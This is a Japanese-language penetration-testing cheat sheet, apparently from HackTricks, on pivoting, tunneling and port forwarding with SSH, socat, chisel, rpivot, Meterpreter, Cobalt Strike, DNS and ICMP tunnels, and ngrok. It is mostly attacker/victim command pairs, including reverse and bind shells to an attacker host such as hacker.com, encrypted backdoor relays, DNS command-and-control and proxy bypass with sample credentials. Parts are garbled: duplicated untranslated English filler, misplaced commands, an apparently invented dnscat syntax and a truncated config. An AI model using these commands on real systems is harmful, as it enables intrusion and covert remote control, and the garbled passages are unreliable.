# トンネリングとポートフォワーディング

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

## Nmapのヒント

{% hint style="warning" %}
**ICMP**と**SYN**スキャンはソックスプロキシを介してトンネリングすることはできませんので、これを動作させるためには**ping discoveryを無効化**(`-Pn`)し、**TCPスキャン**(`-sT`)を指定する必要があります。
{% endhint %}

## **Bash**

**ホスト -> ジャンプ -> 内部A -> 内部B**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSHグラフィカル接続（X）
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### ローカルポート2ポート

SSHサーバーで新しいポートを開く --> 他のポート
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### ポート2ポート

ローカルポート --> 侵害されたホスト（SSH） --> 第三のボックス：ポート
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

ローカルポート --> 侵害されたホスト（SSH） --> どこでも
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### リバースポートフォワーディング

これは、DMZを介して内部ホストから逆シェルを取得するために役立ちます。
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPNトンネル

両方のデバイスで**root権限**が必要です（新しいインターフェースを作成するためです）。また、sshdの設定でrootログインが許可されている必要があります：\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
サーバーサイドで転送を有効にする
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
クライアント側で新しいルートを設定します。

```bash
# ローカルポート 8080 をリモートホストのポート 80 に転送する
ssh -L 8080:localhost:80 user@remote_host

# ローカルポート 8080 をリモートホストのポート 80 に転送する（バックグラウンド実行）
ssh -f -N -L 8080:localhost:80 user@remote_host
```

これにより、クライアント側のポート 8080 にアクセスすると、リモートホストのポート 80 にトンネリングされます。
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

ホストを介して、サブネットワークへのすべてのトラフィックを**ssh**を介して**トンネル**することができます。\
例えば、10.10.10.0/24に向かうすべてのトラフィックを転送します。
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
プライベートキーを使用して接続します。
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### ポートツーポート

ローカルポート --> 侵害されたホスト（アクティブセッション） --> 第三のボックス：ポート
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
SOCKS (Socket Secure)は、ネットワークプロトコルの一種であり、TCP/IP接続を通じてデータを転送するためのプロキシサーバーを提供します。SOCKSプロキシは、クライアントとサーバーの間に中間者として機能し、トラフィックを転送することができます。SOCKSプロキシを使用することで、ユーザーは自分のIPアドレスを隠すことができ、ネットワーク上の制限を回避することができます。

SOCKSプロキシを使用するためには、クライアントアプリケーションがSOCKSプロトコルをサポートしている必要があります。一般的なSOCKSプロキシクライアントとしては、curlやsshなどがあります。

SOCKSプロキシを使用してトンネリングやポートフォワーディングを行う場合、クライアントアプリケーションはSOCKSプロキシサーバーに接続し、プロキシサーバーを介して目的のサーバーに接続します。このようにすることで、クライアントアプリケーションはプロキシサーバーを通じてトラフィックを転送し、目的のサーバーにアクセスすることができます。

SOCKSプロキシを使用したトンネリングやポートフォワーディングは、ネットワークセキュリティやプライバシーの向上に役立ちます。また、制限されたネットワーク環境下でのアクセスや、地理的な制約を回避するためにも使用されます。
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
別の方法:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKSプロキシ

ビーコンを介してトラフィックをルーティングするために使用できる、すべてのインターフェースでリッスンするためのチームサーバーでポートを開きます。
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
この場合、**ポートはビーコンホストで開かれます**が、チームサーバーではなく、トラフィックはチームサーバーに送信され、そこから指定されたホスト：ポートに送信されます。
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
注意事項：

- Beaconの逆ポートフォワードは常にトラフィックをTeam Serverにトンネリングし、Team Serverがトラフィックをその意図した宛先に送信するため、個々のマシン間でトラフィックを中継するためには使用しないでください。
- トラフィックはBeaconのC2トラフィック内でトンネリングされ、別々のソケット上ではなくP2Pリンク上でも動作します。
- 高いポートで逆ポートフォワードを作成するには、ローカル管理者である必要はありません。

### ローカルrPort2Port

{% hint style="warning" %}
この場合、ポートはTeam ServerではなくBeaconホストで開かれ、トラフィックはCobalt Strikeクライアント（Team Serverではなく）に送信され、そこから指定されたホスト：ポートに送信されます。
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

ウェブファイルトンネルをアップロードする必要があります: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)のリリースページからダウンロードできます。\
クライアントとサーバーで**同じバージョンを使用する必要があります**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### ポートフォワーディング

Port forwarding is a technique used to redirect network traffic from one port to another. It is commonly used in situations where a device or service is behind a firewall or NAT (Network Address Translation) and needs to be accessed from outside the network.

ポートフォワーディングは、ネットワークトラフィックを1つのポートから別のポートにリダイレクトするための技術です。これは、デバイスやサービスがファイアウォールやNAT（ネットワークアドレス変換）の背後にあり、ネットワークの外部からアクセスする必要がある場合によく使用されます。

Port forwarding can be done using various methods, including SSH tunneling, reverse SSH tunneling, and tools like ngrok. It allows users to access services running on specific ports on a remote server or device, even if those ports are blocked or not directly accessible from the internet.

ポートフォワーディングは、SSHトンネリング、逆SSHトンネリング、ngrokなどのツールを使用して行うことができます。これにより、特定のポートで実行されているサービスにリモートサーバーやデバイスからアクセスすることができます。これにより、それらのポートがブロックされているか、インターネットから直接アクセスできない場合でも、ユーザーはアクセスすることができます。

Port forwarding is commonly used in scenarios such as remote access to a home network, accessing a web server running on a non-standard port, or exposing a local development server to the internet for testing purposes.

ポートフォワーディングは、ホームネットワークへのリモートアクセス、非標準ポートで実行されているWebサーバーへのアクセス、テスト目的でローカル開発サーバーをインターネットに公開するなどのシナリオでよく使用されます。

Overall, port forwarding is a useful technique for bypassing network restrictions and accessing services that are not directly reachable. It provides flexibility and convenience in managing network traffic and accessing resources remotely.

全体的に、ポートフォワーディングは、ネットワークの制限を回避し、直接到達できないサービスにアクセスするための便利な技術です。ネットワークトラフィックの管理やリモートリソースへのアクセスにおいて、柔軟性と利便性を提供します。
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

リバーストンネル。トンネルは被害者から開始されます。\
127.0.0.1:1080にSocks4プロキシが作成されます。
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLMプロキシ**を介してピボットする
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### バインドシェル
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### リバースシェル

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands. 

To establish a reverse shell, the attacker typically needs to have a listener running on their machine and a payload on the target machine. The payload is usually a piece of code or a script that, when executed on the target machine, connects back to the attacker's machine.

Once the reverse shell connection is established, the attacker can interact with the target machine's command prompt or shell, just as if they were physically present on the machine. This provides the attacker with a powerful tool for remote exploitation and control.

Reverse shells are commonly used in penetration testing and ethical hacking to gain unauthorized access to systems for the purpose of identifying vulnerabilities and improving security. However, they can also be used maliciously by attackers to gain unauthorized access to systems for nefarious purposes.

It is important to note that using reverse shells without proper authorization is illegal and unethical. Only use reverse shells in a legal and responsible manner, with the appropriate permissions and within the boundaries of the law.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### ポートツーポート

ポートツーポート（Port2Port）は、ネットワーク上の2つのポート間で通信を転送するための技術です。これにより、ネットワーク上の異なる場所にある2つのシステム間で通信を確立することができます。

ポートツーポートは、ポートフォワーディングとも呼ばれ、さまざまな目的で使用されます。例えば、セキュリティテスト中に、攻撃者は脆弱なシステムにアクセスするためにポートツーポートを使用することがあります。

ポートツーポートの設定には、いくつかの方法があります。一つは、SSHトンネリングを使用する方法です。SSHトンネリングでは、SSH接続を介してポートを転送することができます。

また、ツールやソフトウェアを使用してポートツーポートを設定することもできます。例えば、`socat`や`netcat`などのツールを使用することができます。

ポートツーポートは、ネットワーク上の通信を制御するための重要な技術です。しかし、悪意のある目的で使用されることもありますので、セキュリティ上の注意が必要です。
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### ソックスを介したポート間の接続

Sometimes, you may need to establish a connection between two ports on different systems. This can be achieved using a SOCKS proxy.

時には、異なるシステム上の2つのポート間で接続を確立する必要があります。これは、SOCKSプロキシを使用して実現することができます。

To do this, you will need a SOCKS proxy server running on a system that has access to both ports. You can use tools like `ssh` or `proxychains` to set up the SOCKS proxy.

これを行うには、両方のポートにアクセスできるシステム上で実行されているSOCKSプロキシサーバーが必要です。`ssh`や`proxychains`などのツールを使用して、SOCKSプロキシを設定することができます。

Here's an example of how to establish a port-to-port connection using a SOCKS proxy:

以下は、SOCKSプロキシを使用してポート間接続を確立する方法の例です。

1. Start the SOCKS proxy server on the system with access to both ports. For example, using `ssh`:

   ```bash
   ssh -D <local_port> <user>@<proxy_server>
   ```

   Replace `<local_port>` with the local port number you want to use for the SOCKS proxy, `<user>` with your username, and `<proxy_server>` with the address of the system running the SOCKS proxy server.

   `<local_port>`をSOCKSプロキシに使用するローカルポート番号、`<user>`をユーザー名、`<proxy_server>`をSOCKSプロキシサーバーを実行しているシステムのアドレスに置き換えてください。

2. Configure the application or service you want to connect to use the SOCKS proxy. This can usually be done by specifying the proxy settings in the application's configuration or using environment variables.

   接続したいアプリケーションやサービスがSOCKSプロキシを使用するように設定します。通常、アプリケーションの設定でプロキシ設定を指定するか、環境変数を使用して行うことができます。

3. Connect to the destination port on the remote system using the local port specified for the SOCKS proxy. For example, using `nc`:

   ```bash
   nc -x localhost:<local_port> <destination_ip> <destination_port>
   ```

   Replace `<local_port>` with the same local port number used for the SOCKS proxy, `<destination_ip>` with the IP address of the remote system, and `<destination_port>` with the port number of the destination service.

   `<local_port>`をSOCKSプロキシに使用したローカルポート番号、`<destination_ip>`をリモートシステムのIPアドレス、`<destination_port>`を宛先サービスのポート番号に置き換えてください。

By setting up a SOCKS proxy and configuring your applications or services to use it, you can establish a connection between two ports on different systems. This can be useful for various purposes, such as accessing services that are only available on specific ports or bypassing network restrictions.
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socatを介したMeterpreter

このテクニックでは、SSL Socatを使用してMeterpreterセッションを確立します。これにより、通信が暗号化され、セキュリティが向上します。

1. まず、攻撃者はリスニングマシンでSSL Socatをセットアップします。これにより、攻撃者のマシンがSSLトンネルを作成し、Meterpreterセッションを受け入れる準備が整います。

2. 次に、攻撃者はリモートマシンにバックドアを配置します。バックドアは、攻撃者のマシンに接続するためのトンネルを作成します。

3. バックドアがリモートマシンに配置されたら、攻撃者は以下のコマンドを使用してMeterpreterセッションを確立します。

```
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork EXEC:"cmd.exe"
```

このコマンドでは、443ポートでSSL Socatをリッスンし、`server.pem`証明書を使用して暗号化を行います。`verify=0`オプションは、証明書の検証を無効にします。`fork`オプションは、新しいプロセスを作成して接続を処理します。`EXEC:"cmd.exe"`は、接続が確立されたら`cmd.exe`を実行します。

4. バックドアがMeterpreterセッションを確立すると、攻撃者はMeterpreterコマンドを使用してリモートマシンを制御できます。

この方法を使用すると、通信が暗号化されるため、ネットワーク上での検出が困難になります。ただし、攻撃者はSSL Socatをセットアップするための事前の準備が必要です。
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
被害者のコンソールで最後の行の代わりに、この行を実行することで**非認証プロキシ**をバイパスすることができます:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

両側で証明書を作成します：クライアントとサーバー
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### リモートポート2ポート

ローカルのSSHポート（22）を攻撃者のホストの443ポートに接続します。
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

これはコンソール版のPuTTYのようなものです（オプションはsshクライアントに非常に似ています）。

このバイナリは被害者で実行されるため、逆接続を持つためにはsshサービスとポートを開く必要があります。その後、ローカルでアクセス可能なポートを自分のマシンのポートにフォワードします。
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### ポート2ポート

任意のポートに対して、ローカル管理者権限が必要です。
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

システム上で**RDPアクセス**が必要です。\
ダウンロード:

1. [SocksOverRDP x64 バイナリ](https://github.com/nccgroup/SocksOverRDP/releases) - このツールは、WindowsのRemote Desktop Service機能の`Dynamic Virtual Channels`（DVC）を使用します。DVCは、**RDP接続を介してパケットをトンネリング**する役割を担っています。
2. [Proxifier ポータブルバイナリ](https://www.proxifier.com/download/#win-tab)

クライアントコンピュータで、**`SocksOverRDP-Plugin.dll`**を次のようにロードします:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
今、**`mstsc.exe`**を使用して**RDP**経由で**被害者**に**接続**できるようになりました。そして、**SocksOverRDPプラグインが有効**になっているという**プロンプト**が表示され、**127.0.0.1:1080**で**リッスン**するはずです。

**RDP**経由で**接続**し、被害者のマシンに**`SocksOverRDP-Server.exe`**バイナリをアップロードして実行してください。
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
次に、自分のマシン（攻撃者）でポート1080がリッスンしていることを確認してください。
```
netstat -antb | findstr 1080
```
今、[**Proxifier**](https://www.proxifier.com/)を使用して、トラフィックをそのポートを介してプロキシすることができます。

## Windows GUIアプリをプロキシ化する

[**Proxifier**](https://www.proxifier.com/)を使用して、Windows GUIアプリをプロキシ経由でナビゲートすることができます。\
**プロファイル -> プロキシサーバー**にSOCKSサーバーのIPとポートを追加します。\
**プロファイル -> プロキシ化ルール**にプロキシ化するプログラムの名前とプロキシ化したいIPへの接続を追加します。

## NTLMプロキシバイパス

先述のツール: **Rpivot**\
**OpenVPN**もこれをバイパスすることができます。設定ファイルで以下のオプションを設定します:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

プロキシに対して認証を行い、指定した外部サービスに転送されるローカルポートをバインドします。その後、このポートを介してお好みのツールを使用することができます。\
例えば、ポート443を転送します。
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
今、例えば被害者の**SSH**サービスをポート443でリッスンするように設定した場合、攻撃者はポート2222を介してそれに接続することができます。\
また、**meterpreter**を使用して、localhost:443に接続し、攻撃者がポート2222でリッスンしている場合も同様です。

## YARP

Microsoftによって作成された逆プロキシ。ここで見つけることができます：[https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNSトンネリング

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

DNSクエリを使用して、チュンアダプタを作成し、両方のシステムでルートが必要です。それらの間でデータをトンネルするために。
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
トンネルは非常に遅くなります。このトンネルを介して圧縮されたSSH接続を作成するには、次の手順を使用します：
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

****[**ここからダウンロードしてください**](https://github.com/iagox86/dnscat2)**.**

DNSを介してC\&Cチャネルを確立します。ルート権限は必要ありません。
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShellで**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)を使用して、PowerShellでdnscat2クライアントを実行できます。
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscatを使用したポートフォワーディング**

dnscatは、DNSトンネリングを使用してポートフォワーディングを実現するツールです。このツールを使用すると、DNSトラフィックを介して通信を行うことができます。

以下の手順に従って、dnscatを使用してポートフォワーディングを設定します。

1. ターゲットマシンにdnscatをインストールします。

2. ローカルマシンでdnscatを起動します。

   ```
   dnscat server -l <local_port>
   ```

   `<local_port>`には、ローカルマシンで使用するポート番号を指定します。

3. ターゲットマシンでdnscatを起動します。

   ```
   dnscat client -c <dns_server> -l <local_port> -r <remote_port>
   ```

   `<dns_server>`には、dnscatサーバーのIPアドレスを指定します。`<local_port>`には、ローカルマシンで使用するポート番号を指定します。`<remote_port>`には、ターゲットマシンで使用するポート番号を指定します。

4. ポートフォワーディングが正常に設定されたかどうかを確認します。

   ```
   nc localhost <local_port>
   ```

   `<local_port>`には、ローカルマシンで使用したポート番号を指定します。接続が成功した場合、ポートフォワーディングが正常に機能しています。

dnscatを使用することで、ポートフォワーディングを簡単に設定することができます。この手法は、セキュリティテストや侵入テストにおいて便利です。
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### プロキシチェーンのDNSを変更する

Proxychainsは、`gethostbyname` libc呼び出しを傍受し、TCP DNSリクエストをソックスプロキシを介してトンネリングします。デフォルトでは、proxychainsが使用するDNSサーバーは4.2.2.2（ハードコードされています）。変更するには、ファイル：_/usr/lib/proxychains3/proxyresolv_を編集し、IPを変更します。**Windows環境**の場合、**ドメインコントローラ**のIPを設定することもできます。

## Goにおけるトンネル

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMPトンネリング

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

両方のシステムでルート権限が必要です。TUNアダプタを作成し、ICMPエコーリクエストを使用してデータをトンネルできます。
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

****[**ここからダウンロードしてください**](https://github.com/utoni/ptunnel-ng.git)。
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/)は、1つのコマンドラインでソリューションをインターネットに公開するためのツールです。**
*公開URIは、UID.ngrok.ioのようなものです。*

### インストール

- アカウントを作成する：https://ngrok.com/signup
- クライアントのダウンロード：
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 基本的な使用法

**ドキュメント:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*必要に応じて、認証とTLSを追加することも可能です。*

#### TCPトンネリング
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTPを使用してファイルを公開する

One common use case for tunneling and port forwarding is to expose files using the HTTP protocol. This can be useful when you want to share files with others or access them remotely.

To expose files with HTTP, you can use tools like `ngrok` or `localtunnel`. These tools create a secure tunnel between your local machine and a public URL, allowing you to access your files from anywhere.

Here's a step-by-step guide on how to expose files using `ngrok`:

1. Download and install `ngrok` from the official website.
2. Open a terminal and navigate to the directory where `ngrok` is installed.
3. Run the command `ngrok http <port>`, replacing `<port>` with the port number of the local server hosting your files.
4. `ngrok` will generate a public URL that you can use to access your files. It will also display the status of the tunnel.
5. Share the generated URL with others or use it to access your files remotely.

Keep in mind that when exposing files with HTTP, anyone with the URL can access them. Make sure to secure your files and only share the URL with trusted individuals.

#### HTTPを使用してファイルを公開する

トンネリングとポートフォワーディングの一般的な使用例の1つは、HTTPプロトコルを使用してファイルを公開することです。これは、他の人とファイルを共有したり、リモートでアクセスしたりする場合に便利です。

HTTPを使用してファイルを公開するには、`ngrok`や`localtunnel`などのツールを使用できます。これらのツールは、ローカルマシンと公開URLの間に安全なトンネルを作成し、どこからでもファイルにアクセスできるようにします。

以下は、`ngrok`を使用してファイルを公開する手順のガイドです：

1. 公式ウェブサイトから`ngrok`をダウンロードしてインストールします。
2. ターミナルを開き、`ngrok`がインストールされているディレクトリに移動します。
3. `ngrok http <port>`というコマンドを実行します。`<port>`は、ファイルをホストしているローカルサーバーのポート番号に置き換えます。
4. `ngrok`は、ファイルにアクセスするために使用できる公開URLを生成します。また、トンネルの状態も表示されます。
5. 生成されたURLを他の人と共有するか、リモートでファイルにアクセスするために使用します。

HTTPを使用してファイルを公開する場合、URLを持つ人は誰でもファイルにアクセスできます。ファイルを保護し、信頼できる個人とのみURLを共有するように注意してください。
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTPコールのスニッフィング

*XSS、SSRF、SSTIに役立ちます...*
標準出力から直接、またはHTTPインターフェース [http://127.0.0.1:4040](http://127.0.0.1:4000) で行います。

#### 内部のHTTPサービスのトンネリング
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yamlのシンプルな設定例

以下は3つのトンネルを開きます：
- 2つのTCPトンネル
- /tmp/httpbin/からの静的ファイル公開を行う1つのHTTPトンネル
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
